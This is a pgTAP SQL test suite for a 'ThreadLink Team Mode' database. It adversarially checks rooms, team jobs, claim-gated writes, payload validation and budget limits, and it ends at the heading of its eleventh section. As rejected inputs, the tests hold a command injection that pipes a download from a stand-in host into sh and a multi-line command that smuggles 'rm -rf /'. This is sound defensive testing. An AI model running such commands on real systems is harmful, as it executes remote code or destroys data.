-- ThreadLink Team Mode: rooms, team jobs, claim-gated team state (pgTAP).
-- LOCAL stack only. Adversarial: every RPC is tried across accounts, rooms,
-- sessions and claims, and every hard rule is tried to be broken.

begin;

create extension if not exists pgtap with schema extensions;

select plan(134);

create function pg_temp.act_as_user(sub text) returns void language plpgsql as $$
begin
  perform set_config('request.jwt.claims', jsonb_build_object('sub', sub, 'role', 'authenticated')::text, true);
  execute 'set local role authenticated';
end;
$$;
create function pg_temp.act_as_client() returns void language plpgsql as $$
begin
  perform set_config('request.jwt.claims', '{"role":"anon"}', true);
  execute 'set local role anon';
end;
$$;
create function pg_temp.h(seed text) returns text language sql as $$ select md5(seed) || md5(seed || ':2') $$;
create function pg_temp.k(seed text) returns text language sql as $$ select encode(sha256(convert_to(seed, 'UTF8')), 'hex') $$;
create temp table ids (name text primary key, value text) on commit drop;
create function pg_temp.id(n text) returns text language sql as $$ select value from ids where name = n $$;
create function pg_temp.put(n text, v text) returns text language sql as $$
  insert into ids values (n, v) on conflict (name) do update set value = excluded.value returning value;
$$;
-- anon cannot select tables: read through definer helpers.
create function pg_temp.job(j text) returns public.team_jobs language sql security definer as $$
  select * from public.team_jobs where id = j $$;
create function pg_temp.room(r text) returns public.rooms language sql security definer as $$
  select * from public.rooms where id = r $$;
create function pg_temp.task(t text) returns public.tasks language sql security definer as $$
  select * from public.tasks where id = t $$;
create function pg_temp.task_count(t text) returns int language sql security definer as $$
  select count(*)::int from public.tasks where id = t $$;
create function pg_temp.profile(u text, p text) returns public.provider_profiles language sql security definer as $$
  select pp.* from public.provider_profiles pp join public.users us on us.id = pp.owner_user_id
  where us.clerk_user_id = u and pp.provider = p $$;
create function pg_temp.session(s text) returns public.session_bindings language sql security definer as $$
  select * from public.session_bindings where id = s $$;
create function pg_temp.audit_count(a text) returns int language sql security definer as $$
  select count(*)::int from public.audit_events where action = a $$;
-- Alice's runtime writing to the main job with the right claim.
create function pg_temp.w(op text, payload jsonb) returns jsonb language sql as $$
  select public.team_job_write(pg_temp.h('a-rt'), pg_temp.id('agent'), pg_temp.id('job'), 'claim-1', op, payload)
$$;
grant select, insert, update on ids to anon, authenticated;
grant execute on all functions in schema pg_temp to anon, authenticated;

-- ---------------------------------------------------------------------------
-- Fixtures: Alice (two chats, one Runtime with two agent sessions), Bob.
-- ---------------------------------------------------------------------------
select pg_temp.act_as_user('user_TeamAlice00001');
select public.provision_current_user('Alice', null);
select public.register_connection('chatgpt', 'controller', 'ChatGPT', pg_temp.h('a-chat'), 'tlc_tacht1');
select public.register_connection('chatgpt', 'controller', 'Other chat', pg_temp.h('a-chat2'), 'tlc_tacht2');
select public.register_connection('claude-code', 'agent', null, pg_temp.h('a-rt'), 'tlc_tart01');
reset role;
select pg_temp.act_as_user('user_TeamBob000001');
select public.provision_current_user('Bob', null);
select public.register_connection('chatgpt', 'controller', 'Bob chat', pg_temp.h('b-chat'), 'tlc_tbchat');
select public.register_connection('claude-code', 'agent', null, pg_temp.h('b-rt'), 'tlc_tbrt01');
reset role;

select pg_temp.act_as_client();
select public.register_runtime(pg_temp.h('a-rt'), 'Laptop', 'windows', 'desktop', '0.7.0');
select pg_temp.put('ws', public.upsert_runtime_workspace(pg_temp.h('a-rt'), pg_temp.k('C:/work/Prism'),
  'Prism', 'C:\work\Prism', null, null, null) ->> 'id');
select pg_temp.put('ws2', public.upsert_runtime_workspace(pg_temp.h('a-rt'), pg_temp.k('C:/work/Other'),
  'Other', 'C:\work\Other', null, null, null) ->> 'id');
select public.runtime_heartbeat(pg_temp.h('a-rt'), '0.7.0', '{"claude-code":"available"}', '{}');
select pg_temp.put('agent', public.register_runtime_session(pg_temp.h('a-rt'), pg_temp.id('ws'),
  'cc-worker:prism', 'Prism worker', 'claude-code', 'fresh', null) ->> 'id');
select pg_temp.put('agent2', public.register_runtime_session(pg_temp.h('a-rt'), pg_temp.id('ws2'),
  'cc-worker:other', 'Other worker', 'claude-code', 'fresh', null) ->> 'id');
select pg_temp.put('chat', public.register_session(pg_temp.h('a-chat'), null, null, 'chat-1') ->> 'id');
select pg_temp.put('chat2', public.register_session(pg_temp.h('a-chat2'), null, null, 'chat-2') ->> 'id');
select pg_temp.put('link', public.request_pairing(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('agent')) ->> 'id');
select public.approve_pairing(pg_temp.h('a-rt'), pg_temp.id('agent'), pg_temp.id('link'));

select public.register_runtime(pg_temp.h('b-rt'), 'Bob PC', 'linux', 'desktop', '0.7.0');
select pg_temp.put('bws', public.upsert_runtime_workspace(pg_temp.h('b-rt'), pg_temp.k('/home/bob/x'),
  'X', '/home/bob/x', null, null, null) ->> 'id');
select public.runtime_heartbeat(pg_temp.h('b-rt'), '0.7.0', '{"claude-code":"available"}', '{}');
select pg_temp.put('bagent', public.register_runtime_session(pg_temp.h('b-rt'), pg_temp.id('bws'),
  'cc-worker:x', 'X worker', 'claude-code', 'fresh', null) ->> 'id');
select pg_temp.put('bchat', public.register_session(pg_temp.h('b-chat'), null, null, 'bchat-1') ->> 'id');
select pg_temp.put('blink', public.request_pairing(pg_temp.h('b-chat'), pg_temp.id('bchat'), pg_temp.id('bagent')) ->> 'id');
select public.approve_pairing(pg_temp.h('b-rt'), pg_temp.id('bagent'), pg_temp.id('blink'));
-- Bob's Runtime is Team-capable: it has reported both agents ready.
select public.report_provider_detection(pg_temp.h('b-rt'), 'claude-code', '{"installed":true,"authenticated":true,"authMethod":"claude.ai"}'::jsonb || jsonb_build_object('health', 'ready', 'healthCheckedAt', to_char(now() at time zone 'utc', 'YYYY-MM-DD"T"HH24:MI:SS"Z"')));
select public.report_provider_detection(pg_temp.h('b-rt'), 'codex', '{"installed":true,"authenticated":true,"authMethod":"chatgpt"}'::jsonb || jsonb_build_object('health', 'ready', 'healthCheckedAt', to_char(now() at time zone 'utc', 'YYYY-MM-DD"T"HH24:MI:SS"Z"')));

-- ===========================================================================
-- 1. Privileges and schema shape
-- ===========================================================================
reset role;
select ok(not has_function_privilege('authenticated',
  'public.team_job_write(text, text, text, text, text, jsonb)', 'execute'),
  'a signed-in dashboard user cannot call the runtime write RPC');
select ok(has_function_privilege('anon',
  'public.team_job_write(text, text, text, text, text, jsonb)', 'execute'),
  'the credential-authenticated server path (anon) can');
select ok(not has_function_privilege('authenticated',
  'public.start_team_job(text, text, text, text, jsonb, integer, integer, integer, text[], text)', 'execute'),
  'authenticated cannot call start_team_job');
select ok(not has_function_privilege('authenticated', 'public.create_room(text, text, text, text)', 'execute'),
  'authenticated cannot call create_room');
select ok(not has_function_privilege('authenticated', 'public.list_rooms(text, text)', 'execute')
  and not has_function_privilege('authenticated', 'public.get_room(text, text, text)', 'execute')
  and not has_function_privilege('authenticated', 'public.get_team_status(text, text, text, text)', 'execute')
  and not has_function_privilege('authenticated',
        'public.get_team_log(text, text, text, text, integer, integer)', 'execute')
  and not has_function_privilege('authenticated', 'public.get_provider_profiles(text)', 'execute')
  and not has_function_privilege('authenticated', 'public.report_provider_detection(text, text, jsonb)', 'execute'),
  'authenticated cannot call any other controller/runtime RPC');
select ok(not has_function_privilege('anon', 'public.set_provider_profile(text, text, text, boolean)', 'execute'),
  'anon cannot set a provider profile');
select ok(not has_function_privilege('anon', 'public.delete_room(text)', 'execute')
  and not has_function_privilege('anon', 'public.rename_room(text, text)', 'execute')
  and not has_function_privilege('anon', 'public.archive_room(text, boolean)', 'execute')
  and not has_function_privilege('anon', 'public.remove_conversation(text)', 'execute')
  and not has_function_privilege('anon',
        'public.update_room_policy(text, integer, integer, integer, text, boolean, boolean, text[])', 'execute'),
  'anon cannot call any owner RPC');
select ok(has_function_privilege('authenticated', 'public.set_provider_profile(text, text, text, boolean)', 'execute')
  and has_function_privilege('authenticated', 'public.delete_room(text)', 'execute')
  and has_function_privilege('authenticated', 'public.remove_conversation(text)', 'execute'),
  'owner RPCs are for authenticated');
select ok(not has_function_privilege('authenticated', 'threadlink_private.team_status_json(text)', 'execute')
  and not has_function_privilege('authenticated', 'threadlink_private.team_advance(text, text)', 'execute'),
  'private team helpers are not callable by clients');
select ok(not has_table_privilege('authenticated', 'public.team_jobs', 'insert')
  and not has_table_privilege('authenticated', 'public.team_jobs', 'update')
  and not has_table_privilege('authenticated', 'public.rooms', 'delete')
  and not has_table_privilege('authenticated', 'public.provider_profiles', 'update')
  and not has_table_privilege('anon', 'public.rooms', 'select'),
  'no direct write grants on team tables; anon reads nothing');

select is(
  (select count(*)::int from pg_class c join pg_namespace n on n.oid = c.relnamespace
   where n.nspname = 'public' and c.relrowsecurity
     and c.relname in ('rooms', 'room_agents', 'team_jobs', 'team_nodes', 'team_messages', 'team_findings',
                       'team_decisions', 'model_usage_events', 'provider_profiles')),
  9, 'RLS is enabled on every team table');

select is(
  (select count(*)::int from information_schema.columns
   where table_schema = 'public' and table_name = 'provider_profiles'
     and column_name ~* '(email|org|token|secret|password|key|credential|cookie|auth)'),
  0, 'provider_profiles has no credential- or identity-shaped column');

-- ===========================================================================
-- 2. Rooms (controller)
-- ===========================================================================
select pg_temp.act_as_client();
select pg_temp.put('roomA', public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), 'Prism') ->> 'room_id');
select is((pg_temp.room(pg_temp.id('roomA'))).workspace_id, pg_temp.id('ws'),
  'a room binds to the workspace of the linked agent session');
select is((pg_temp.room(pg_temp.id('roomA'))).agent_session_id, pg_temp.id('agent'),
  'and to that agent session');
select is(public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), 'prism') ->> 'created', 'false',
  'creating the same room again returns it (idempotent by name)');
select is(jsonb_array_length(public.get_room(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA')) -> 'agents'),
  2, 'a room starts with both providers');

-- A second link, so the caller must choose.
select pg_temp.put('link2', public.request_pairing(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('agent2')) ->> 'id');
select public.approve_pairing(pg_temp.h('a-rt'), pg_temp.id('agent2'), pg_temp.id('link2'));
select throws_ok($$ select public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), 'Other') $$,
  '22023', null, 'with two active links the database never guesses');
select pg_temp.put('roomB', public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), 'Other', pg_temp.id('link2')) ->> 'room_id');
select is((pg_temp.room(pg_temp.id('roomB'))).agent_session_id, pg_temp.id('agent2'), 'the chosen link decides');

select throws_ok($$ select public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), 'Stolen', pg_temp.id('blink')) $$,
  'P0002', null, 'another account''s link cannot be used to create a room');
select throws_ok($$ select public.create_room(pg_temp.h('a-chat2'), pg_temp.id('chat2'), 'Nope') $$,
  'P0002', null, 'a chat with no link cannot create a room');
select throws_ok($$ select public.create_room(pg_temp.h('a-rt'), pg_temp.id('agent'), 'Nope') $$,
  '42501', null, 'an agent credential cannot create rooms');
select throws_ok($$ select public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), '') $$,
  '22023', null, 'an empty room name is refused');
select throws_ok($$ select public.create_room(pg_temp.h('a-chat'), pg_temp.id('chat'), repeat('x', 101), pg_temp.id('link')) $$,
  '22023', null, 'an oversized room name is refused');

select throws_ok($$ select public.get_room(pg_temp.h('b-chat'), pg_temp.id('bchat'), pg_temp.id('roomA')) $$,
  'P0002', null, 'another account cannot read the room');
select throws_ok($$ select public.get_room(pg_temp.h('b-chat'), pg_temp.id('chat'), pg_temp.id('roomA')) $$,
  'P0002', null, 'nor by naming the owner''s session with its own credential');
select is(jsonb_array_length(public.list_rooms(pg_temp.h('b-chat'), pg_temp.id('bchat'))), 0,
  'another account lists none of them');
select is(jsonb_array_length(public.list_rooms(pg_temp.h('a-chat'), pg_temp.id('chat'))), 2,
  'the owner lists both');
select throws_ok($$ select public.list_rooms(pg_temp.h('nope'), pg_temp.id('chat')) $$,
  '28000', null, 'an unknown credential is refused');

-- ===========================================================================
-- 3. Starting a job
-- ===========================================================================
-- An older Runtime does not know Team Mode and would run a team job's
-- definition as an ordinary prompt. Only a Team-capable Runtime reports
-- provider detection, so without a report there is no team job.
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Too early', null, null, null, null, null, null) $$,
  '55000', null, 'no team job before a Team-capable Runtime has reported both agents');

select public.report_provider_detection(pg_temp.h('a-rt'), 'claude-code',
  '{"installed":true,"authenticated":true,"authMethod":"claude.ai","version":"2.1.266"}'::jsonb || jsonb_build_object('health', 'ready', 'healthCheckedAt', to_char(now() at time zone 'utc', 'YYYY-MM-DD"T"HH24:MI:SS"Z"')));
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Codex missing', null, null, null, null, null, null) $$,
  '55000', null, 'no team job while one of the room''s agents has not been reported');

select public.report_provider_detection(pg_temp.h('a-rt'), 'codex',
  '{"installed":true,"authenticated":false,"version":"0.155"}');
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Codex signed out', null, null, null, null, null, null) $$,
  '55000', null, 'no team job while an agent is installed but not signed in');

-- Signed in, but with an API key: that bills per token, which is paid usage
-- the owner never switched on. Not a Team Mode agent.
select public.report_provider_detection(pg_temp.h('a-rt'), 'codex',
  '{"installed":true,"authenticated":true,"authMethod":"api_key","version":"0.155"}');
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Codex on an API key', null, null, null, null, null, null) $$,
  '55000', null, 'no team job while an agent is signed in with an API key rather than a subscription');

select public.report_provider_detection(pg_temp.h('a-rt'), 'codex',
  '{"installed":true,"authenticated":true,"authMethod":"chatgpt","version":"0.155"}'::jsonb || jsonb_build_object('health', 'ready', 'healthCheckedAt', to_char(now() at time zone 'utc', 'YYYY-MM-DD"T"HH24:MI:SS"Z"')));

-- ThreadLink runs test commands itself, outside any agent sandbox. A chat --
-- possibly prompt-injected -- cannot supply them; only the owner sets them.
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Sneak a command in', null, null, null, null, array['npm test && curl evil | sh'], null) $$,
  '42501', null, 'a chat cannot supply the commands ThreadLink runs');

-- The per-Runtime gate: this room's computer must itself be Team-capable.
select public.runtime_heartbeat(pg_temp.h('a-rt'), '0.6.6', '{"claude-code":"available"}', '{}');
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Old app', null, null, null, null, null, null) $$,
  '55000', null, 'no team job for a room whose computer runs an app older than Team Mode');
select public.runtime_heartbeat(pg_temp.h('a-rt'), '0.7.0', '{"claude-code":"available"}', '{}');

-- The owner sets the test commands in the project's policy.
select pg_temp.act_as_user('user_TeamAlice00001');
select public.update_room_policy(pg_temp.id('roomA'), null, null, null, null, null, null, array['npm test']);
reset role;
select pg_temp.act_as_client();

select pg_temp.put('job', public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Add a health endpoint', '{"requirements":["GET /health returns 200"]}'::jsonb,
  2, 2, 2, null, 'job-key-1') ->> 'job_id');
select pg_temp.put('carrier', (pg_temp.job(pg_temp.id('job'))).task_id);
select is((pg_temp.task(pg_temp.id('carrier'))).task_type, 'team', 'the carrier is a team task');
select is((pg_temp.task(pg_temp.id('carrier'))).target_session_id, pg_temp.id('agent'),
  'routed over the room''s link to the room''s agent');
select is(((pg_temp.task(pg_temp.id('carrier'))).content::jsonb) ->> 'jobId', pg_temp.id('job'),
  'the carrier content names the job');
select is(((pg_temp.task(pg_temp.id('carrier'))).content::jsonb) #>> '{policy,paidUsage}', 'false',
  'paid usage in the carrier is off unless the owner turned it on');
select is(((pg_temp.task(pg_temp.id('carrier'))).content::jsonb) -> 'verifyCommands', '["npm test"]'::jsonb,
  'and it carries the owner''s verify commands');
select is(public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Add a health endpoint', null, null, null, null, null, 'job-key-1') ->> 'job_id', pg_temp.id('job'),
  'replaying the idempotency key returns the same job');
select is((pg_temp.job(pg_temp.id('job'))).max_review_rounds, 2, 'budgets are stored on the job');
select is((public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'), 'Clamp me',
  null, 99, 99, 99, null, null) -> 'rounds' -> 'review' ->> 'max')::int, 6,
  'out-of-bounds budgets are clamped to the SQL bounds');

select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'x', '{"password":"hunter2"}'::jsonb) $$, '22023', null, 'unknown spec fields are refused');
-- Test commands are the owner's to set, and even the owner cannot set one that
-- smuggles a second command onto a new line.
select pg_temp.act_as_user('user_TeamAlice00001');
select throws_ok($$ select public.update_room_policy(pg_temp.id('roomA'), null, null, null, null, null, null,
  array[E'npm test
rm -rf /']) $$, '22023', null,
  'a multi-line verify command is refused');
reset role;
select pg_temp.act_as_client();
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  repeat('g', 8001)) $$, '22023', null, 'an oversized goal is refused');
select throws_ok($$ select public.start_team_job(pg_temp.h('b-chat'), pg_temp.id('bchat'), pg_temp.id('roomA'), 'x') $$,
  'P0002', null, 'another account cannot start a job in the room');
select throws_ok($$ select public.start_team_job(pg_temp.h('a-chat2'), pg_temp.id('chat2'), pg_temp.id('roomA'), 'x') $$,
  'P0002', null, 'a chat without a link to the room''s agent cannot start a job');
select throws_ok($$ select public.start_team_job(pg_temp.h('a-rt'), pg_temp.id('agent'), pg_temp.id('roomA'), 'x') $$,
  '42501', null, 'an agent cannot start jobs');

-- ===========================================================================
-- 4. Controller reads: cross-user, cross-room, cross-chat
-- ===========================================================================
select is(public.get_team_status(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('job')) ->> 'status',
  'queued', 'the starting controller reads the concise status');
select is(public.get_team_status(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('job'), pg_temp.id('roomA'))
  ->> 'room_id', pg_temp.id('roomA'), 'with its own room context');
select throws_ok($$ select public.get_team_status(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('job'),
  pg_temp.id('roomB')) $$, 'P0002', null, 'a job id from room A with room B''s context is not found');
select throws_ok($$ select public.get_team_log(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('job'),
  pg_temp.id('roomB')) $$, 'P0002', null, 'and neither is its log');
select throws_ok($$ select public.get_team_status(pg_temp.h('b-chat'), pg_temp.id('bchat'), pg_temp.id('job')) $$,
  'P0002', null, 'another account cannot read the status');
select throws_ok($$ select public.get_team_log(pg_temp.h('b-chat'), pg_temp.id('bchat'), pg_temp.id('job')) $$,
  'P0002', null, 'or the log');
select throws_ok($$ select public.get_team_status(pg_temp.h('a-chat2'), pg_temp.id('chat2'), pg_temp.id('job')) $$,
  'P0002', null, 'another chat of the same owner cannot read a job it did not start');
select throws_ok($$ select public.get_team_status(pg_temp.h('a-rt'), pg_temp.id('agent'), pg_temp.id('job')) $$,
  '42501', null, 'the agent cannot use the controller read');
select throws_ok($$ select public.get_team_log(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('job'), null, 0, 101) $$,
  '22023', null, 'the log page size is bounded');

-- ===========================================================================
-- 5. Runtime write authority: only the claim holder
-- ===========================================================================
select throws_ok($$ select pg_temp.w('add_message', '{"sender":"codex","type":"proposal","body":"hi"}') $$,
  '55000', null, 'before the carrier is claimed nobody can write');
select public.claim_task(pg_temp.h('a-rt'), pg_temp.id('agent'), pg_temp.id('carrier'), 'claim-1');
select is(pg_temp.w('add_message', '{"sender":"codex","type":"proposal","body":"hi"}') ->> 'op', 'add_message',
  'the claim holder can write');
select throws_ok($$ select public.team_job_write(pg_temp.h('a-rt'), pg_temp.id('agent'), pg_temp.id('job'),
  'claim-2', 'add_message', '{"sender":"codex","type":"proposal","body":"hi"}') $$,
  '55000', null, 'a wrong claim_ref is refused');
select throws_ok($$ select public.team_job_write(pg_temp.h('a-rt'), pg_temp.id('agent2'), pg_temp.id('job'),
  'claim-1', 'add_message', '{"sender":"codex","type":"proposal","body":"hi"}') $$,
  'P0002', null, 'a different runtime session cannot write, even with the claim ref');
select throws_ok($$ select public.team_job_write(pg_temp.h('b-rt'), pg_temp.id('bagent'), pg_temp.id('job'),
  'claim-1', 'add_message', '{"sender":"codex","type":"proposal","body":"hi"}') $$,
  'P0002', null, 'another account''s runtime cannot write');
select throws_ok($$ select public.team_job_write(pg_temp.h('b-rt'), pg_temp.id('agent'), pg_temp.id('job'),
  'claim-1', 'add_message', '{"sender":"codex","type":"proposal","body":"hi"}') $$,
  'P0002', null, 'nor by naming the owner''s session with its own credential');
select throws_ok($$ select public.team_job_write(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('job'),
  'claim-1', 'add_message', '{"sender":"codex","type":"proposal","body":"hi"}') $$,
  '42501', null, 'the controller cannot write team state');

-- ===========================================================================
-- 6. Payload validation
-- ===========================================================================
select throws_ok($$ select pg_temp.w('drop_tables', '{}') $$, '22023', null, 'an unknown op is refused');
select throws_ok($$ select pg_temp.w('add_message', '{"sender":"codex","type":"gossip","body":"hi"}') $$,
  '22023', null, 'an invalid message type is refused');
select throws_ok($$ select pg_temp.w('add_message', '{"sender":"gpt-9","type":"proposal","body":"hi"}') $$,
  '22023', null, 'an invalid sender is refused');
select throws_ok($$ select pg_temp.w('add_message', jsonb_build_object('sender','codex','type','review','body', repeat('x', 8193))) $$,
  '22023', null, 'a message body over 8 KB is refused');
select throws_ok($$ select pg_temp.w('add_message', '{"sender":"codex","type":"proposal","body":"hi","owner_user_id":"x"}') $$,
  '22023', null, 'unknown payload keys are refused');
select throws_ok($$ select pg_temp.w('add_message', '{"sender":"codex","type":"proposal","body":42}') $$,
  '22023', null, 'a wrongly typed field is refused');
select throws_ok($$ select pg_temp.w('add_finding', '{"severity":"catastrophic","category":"security","title":"t","body":"b","raised_by":"codex"}') $$,
  '22023', null, 'an invalid finding severity is refused');
select throws_ok($$ select pg_temp.w('add_finding', jsonb_build_object('severity','important','category','security',
  'title','t','body', repeat('x', 9000),'raised_by','codex')) $$,
  '22023', null, 'a finding body over 8 KB is refused');
select throws_ok($$ select pg_temp.w('record_usage', '{"provider":"claude-code","role":"builder","requested_model":"m",
  "model_class":"ULTRA","reason":"r","outcome":"ok"}') $$, '22023', null, 'an invalid model class is refused');
select throws_ok($$ select pg_temp.w('set_status', '{"status":"completed"}') $$,
  '22023', null, 'set_status cannot claim a verdict status');
select throws_ok($$ select pg_temp.w('set_status', '{"status":"failed"}') $$,
  '22023', null, 'nor failed');
select throws_ok($$ select pg_temp.w('set_final', '{"verdict":"MOSTLY_PASS","evidence":{}}') $$,
  '22023', null, 'an invalid verdict is refused');

-- ===========================================================================
-- 7. Spec, plan and nodes
-- ===========================================================================
select is(pg_temp.w('set_spec', '{"spec":{"goal":"Add a health endpoint","requirements":["200 OK"]}}') ->> 'status',
  'normalising', 'storing the spec moves the job to normalising');
select throws_ok($$ select pg_temp.w('set_spec', '{"spec":{"goal":"Something else"}}') $$,
  '55000', null, 'the spec is stored once and never reinterpreted');
select is(pg_temp.w('set_plan', '{"plan":{"summary":"two nodes"},"approved_by":["codex"]}') ->> 'plan_approved', 'true',
  'an approved plan is recorded with its hash');
select is((pg_temp.job(pg_temp.id('job'))).plan_hash,
  encode(sha256(convert_to('{"summary": "two nodes"}', 'UTF8')), 'hex'), 'the hash is sha256 of the stored plan');

select throws_ok($$ select pg_temp.w('upsert_nodes', '{"nodes":[{"key":"api","title":"API","owner_provider":"codex","reviewer_provider":"codex"}]}') $$,
  '23514', null, 'a node can never be reviewed by its own author provider');
select throws_ok($$ select pg_temp.w('upsert_nodes', '{"nodes":[{"key":"a","title":"A","owner_provider":"codex","depends_on":["b"]},
  {"key":"b","title":"B","owner_provider":"claude-code","depends_on":["a"]}]}') $$,
  '22023', null, 'a dependency cycle is refused');
select throws_ok($$ select pg_temp.w('upsert_nodes', '{"nodes":[{"key":"a","title":"A","owner_provider":"codex","depends_on":["ghost"]}]}') $$,
  '22023', null, 'an unknown dependency is refused');
select is((pg_temp.w('upsert_nodes', '{"nodes":[
  {"key":"api","title":"API","owner_provider":"codex","reviewer_provider":"claude-code","files":["app/api/**"]},
  {"key":"tests","title":"Tests","owner_provider":"claude-code","reviewer_provider":"codex","depends_on":["api"]}]}')
  ->> 'nodes_total')::int, 2, 'a valid DAG is stored');
select throws_ok($$ select pg_temp.w('upsert_nodes', '{"nodes":[{"key":"docs","title":"Docs","owner_provider":"codex","reviewer_provider":"claude-code","status":"approved"}]}') $$,
  '22023', null, 'a node cannot be born approved: approval goes through set_node_status');
select throws_ok($$ select pg_temp.w('upsert_nodes', '{"nodes":[{"key":"api","title":"API","owner_provider":"claude-code","reviewer_provider":"codex"}]}') $$,
  '55000', null, 'node ownership changes only through a recorded decision');

-- ===========================================================================
-- 8. Budgets: round counters can never exceed the job's budget
-- ===========================================================================
select is((pg_temp.w('open_round', '{"kind":"planning"}') #>> '{rounds,planning,n}')::int, 1, 'planning round 1 opens');
select is((pg_temp.w('open_round', '{"kind":"planning","round":1}') #>> '{rounds,planning,n}')::int, 1,
  'retrying an open round changes nothing');
select is((pg_temp.w('open_round', '{"kind":"planning"}') #>> '{rounds,planning,n}')::int, 2, 'planning round 2 opens');
select throws_ok($$ select pg_temp.w('open_round', '{"kind":"planning"}') $$,
  '54000', null, 'a third planning round is refused past the budget of 2');
select is((pg_temp.w('open_round', '{"kind":"review"}') #>> '{rounds,review,n}')::int, 1, 'review round 1 opens');
select is(pg_temp.w('open_round', '{"kind":"review"}') ->> 'status', 'reviewing', 'review round 2 opens');
select throws_ok($$ select pg_temp.w('open_round', '{"kind":"review"}') $$,
  '54000', null, 'a third review round is refused past the budget of 2');
select is((pg_temp.job(pg_temp.id('job'))).review_round, 2, 'the counter stayed at the budget');
select throws_ok($$ update public.team_jobs set review_round = 3 where id = pg_temp.id('job') $$,
  '42501', null, 'clients cannot touch the counter directly');

-- ===========================================================================
-- 9. The PASS rule
-- ===========================================================================
select pg_temp.put('finding', pg_temp.w('add_finding', '{"node_key":"api","severity":"blocking","category":"security",
  "title":"No auth","body":"The endpoint leaks the version","raised_by":"claude-code","phase":"review"}')
  #>> '{result,finding_id}');
select is((pg_temp.w('set_node_status', '{"key":"api","status":"running"}') -> 'open_findings' ->> 'blocking')::int, 1,
  'the concise status counts the open blocking finding');
select throws_ok($$ select pg_temp.w('set_node_status', '{"key":"api","status":"approved"}') $$,
  '55000', null, 'a node with an open blocking finding cannot be approved');
select throws_ok($$ select pg_temp.w('set_final', '{"verdict":"PASS","evidence":{"tests":[]}}') $$,
  '55000', null, 'PASS is refused while a blocking finding is open');
select throws_ok($$ select pg_temp.w('set_finding_status',
  jsonb_build_object('finding_id', pg_temp.id('finding'), 'status', 'wont_fix')) $$,
  '55000', null, 'a blocking finding is not waved away without a recorded decision');
select pg_temp.w('set_finding_status', jsonb_build_object('finding_id', pg_temp.id('finding'), 'status', 'resolved',
  'resolution', 'Auth added'));
select pg_temp.w('set_node_status', '{"key":"api","status":"approved"}');
-- "tests" has not been approved yet. (A failed unit is final and is covered in
-- 012_team_security; here the scenario goes on to a legitimate PASS.)
select throws_ok($$ select pg_temp.w('set_final', '{"verdict":"PASS","evidence":{"tests":[]}}') $$,
  '55000', null, 'PASS is refused while a node is unfinished');
select pg_temp.w('set_node_status', '{"key":"tests","status":"approved"}');
select pg_temp.w('set_plan', '{"plan":{"summary":"edited after approval"}}');
select throws_ok($$ select pg_temp.w('set_final', '{"verdict":"PASS","evidence":{"tests":[]}}') $$,
  '55000', null, 'PASS is refused when the plan changed after approval');
select pg_temp.w('set_plan', '{"plan":{"summary":"edited after approval"},"approved_by":["codex","claude-code"]}');

-- Cross-job finding id.
select pg_temp.put('bjob', public.start_team_job(pg_temp.h('b-chat'), pg_temp.id('bchat'),
  public.create_room(pg_temp.h('b-chat'), pg_temp.id('bchat'), 'Bob room') ->> 'room_id', 'Bob goal') ->> 'job_id');
select throws_ok($$ select pg_temp.w('set_finding_status', '{"finding_id":"tlfnd_00000000000000000000000000000000","status":"resolved"}') $$,
  'P0002', null, 'an unknown or foreign finding id is not found');

select pg_temp.put('dec', pg_temp.w('add_decision', '{"title":"Keep REST","resolution":"REST it is","basis":"architecture",
  "approved_by":["codex"]}') #>> '{result,number}');
select ok(pg_temp.id('dec')::int >= 1, 'decisions get a per-owner number');
select is(pg_temp.w('set_final', '{"verdict":"PASS","summary":"Done","evidence":{"tests":[{"command":"npm test","ok":true}]}}')
  ->> 'verdict', 'PASS', 'PASS is accepted once every rule holds');
select is((pg_temp.job(pg_temp.id('job'))).status, 'completed', 'and completes the job');
select throws_ok($$ select pg_temp.w('add_message', '{"sender":"codex","type":"proposal","body":"late"}') $$,
  '55000', null, 'a finished job accepts no more writes');

-- ===========================================================================
-- 10. A job whose carrier dies ends too
-- ===========================================================================
select pg_temp.put('job2', public.start_team_job(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA'),
  'Second job') ->> 'job_id');
select public.claim_task(pg_temp.h('a-rt'), pg_temp.id('agent'), (pg_temp.job(pg_temp.id('job2'))).task_id, 'claim-9');
select public.fail_task(pg_temp.h('a-rt'), pg_temp.id('agent'), (pg_temp.job(pg_temp.id('job2'))).task_id,
  'claim-9', 'crashed');
select is((pg_temp.job(pg_temp.id('job2'))).status, 'failed', 'a failed carrier fails its job');

-- ===========================================================================
-- 11. Owner operations
